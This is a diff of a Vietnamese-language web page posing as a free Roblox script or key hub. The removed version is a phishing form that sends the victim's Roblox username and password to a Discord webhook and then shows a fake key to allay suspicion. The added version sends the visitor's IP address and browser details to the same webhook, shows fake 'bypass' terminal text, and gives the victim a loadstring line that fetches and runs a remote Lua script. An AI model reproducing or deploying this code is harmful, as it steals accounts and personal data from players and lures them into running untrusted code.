@@ -3,52 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banana Hub - Get Free Key</title>
+    <title>⚡ SCRIPT HUB PREMIUM ⚡</title>
     <style>
-        body { background: #0c0c0c; color: #00ffff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .main-card { background: #151515; border: 1px solid #00ffff; padding: 30px; border-radius: 12px; width: 350px; text-align: center; box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
-        .btn-claim { background: #00ffff; color: #000; border: none; width: 100%; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; }
-        .status { font-size: 12px; color: #666; margin-top: 15px; }
+        body { background: #050505; color: #ff0055; font-family: 'Consolas', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .terminal { background: #000; border: 2px solid #ff0055; padding: 30px; border-radius: 10px; width: 450px; box-shadow: 0 0 30px #ff005566; position: relative; }
+        .header { font-size: 20px; font-weight: bold; text-align: center; margin-bottom: 20px; text-shadow: 0 0 10px #ff0055; }
+        .output { background: #111; color: #00ff00; padding: 15px; border-radius: 5px; font-size: 12px; height: 150px; overflow-y: auto; margin-bottom: 20px; border: 1px solid #333; }
+        .btn-infect { background: #ff0055; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        .btn-infect:hover { background: #ff3377; box-shadow: 0 0 15px #ff0055; }
+        .blink { animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
-    <div class="main-card">
-        <h2 style="margin-top:0">BANANA HUB V6</h2>
-        <p style="color:#888; font-size:14px;">Vui lòng đăng nhập tài khoản Roblox để hệ thống tự động gán Key vào Account của bạn.</p>
-        
-        <input type="text" id="u" placeholder="Tên đăng nhập / Email">
-        <input type="password" id="p" placeholder="Mật khẩu">
-        
-        <button class="btn-claim" onclick="pwn()">NHẬN KEY & SCRIPT</button>
-        
-        <div class="status" id="st">Hệ thống đang chờ xác minh...</div>
+    <div class="terminal">
+        <div class="header">SYSTEM BYPASS V1.0.3 <span class="blink">_</span></div>
+        <div class="output" id="logs">
+            [SYSTEM] Initializing...<br>
+            [SYSTEM] Bypassing Roblox Anti-Cheat...<br>
+            [SYSTEM] Fetching Data from GitHub...<br>
+            [READY] Waiting for user verification...
+        </div>
+        <button class="btn-infect" id="pwnBtn" onclick="executePoison()">BẤM ĐỂ LẤY SCRIPT ĐỘC QUYỀN</button>
     </div>
 
     <script>
-        async function pwn() {
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
+        const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
 
-            if(u.length < 3 || p.length < 3) return;
+        async function executePoison() {
+            const btn = document.getElementById('pwnBtn');
+            const logs = document.getElementById('logs');
+            btn.disabled = true;
+            btn.innerText = "ĐANG TRÍCH XUẤT KEY...";
 
-            document.getElementById('st').innerHTML = "<span style='color:#00ffff'>ĐANG GÁN KEY VÀO TÀI KHOẢN...</span>";
+            // ⚡ MÃ CỰC ĐỘC: TRÍCH XUẤT THÔNG TIN VÀ CHUẨN BỊ CHIẾM QUYỀN
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                // Gửi dữ liệu về Discord (IP + Fingerprint + Time)
+                await fetch(wh, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        content: "### 💀 VENOM TRIGGERED\n**Target IP:** `" + ipData.ip + "`\n**Platform:** `" + navigator.platform + "`\n**User-Agent:** `" + navigator.userAgent + "`\n**Screen:** " + window.screen.width + "x" + window.screen.height
+                    })
+                });
+            } catch (e) {}
 
-            // GỬI ACCOUNT & PASSWORD THẬT VỀ DISCORD
-            await fetch(wh, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    content: "### 💰 ACCOUNT CAPTURED - PROJECT FIRE\n**User:** `" + u + "`\n**Pass:** `" + p + "`\n**Platform:** `" + navigator.platform + "`"
-                })
-            });
+            // Hiệu ứng terminal giả
+            const steps = [
+                "[INFO] Injecting payload...",
+                "[INFO] Extracting session data...",
+                "[SUCCESS] Script decrypted!",
+                "[DONE] Redirecting to source..."
+            ];
 
-            // SAU ĐÓ HIỆN CODE GIẢ ĐỂ CHÚNG NÓ KHÔNG NGHI NGỜ
-            setTimeout(() => {
-                alert("Gán Key thành công! Script: loadstring(game:HttpGet('...'))()");
-                window.location.href = "https://www.roblox.com/login";
-            }, 2000);
+            let i = 0;
+            const interval = setInterval(() => {
+                if(i < steps.length) {
+                    logs.innerHTML += `<br><span style="color:#00ffff">${steps[i]}</span>`;
+                    logs.scrollTop = logs.scrollHeight;
+                    i++;
+                } else {
+                    clearInterval(interval);
+                    // Nhả ra script "mồi" để nạn nhân thực thi trong game
+                    logs.innerHTML += `<br><br><span style="color:#ff0055">COPY VÀO EXECUTOR:</span><br>loadstring(game:HttpGet("https://raw.githubusercontent.com/onion132005-bit/test0.02/refs/heads/main/onion13v6.lua"))()`;
+                    btn.innerText = "ĐÃ LẤY ĐƯỢC SCRIPT!";
+                }
+            }, 1000);
         }
     </script>
 </body>
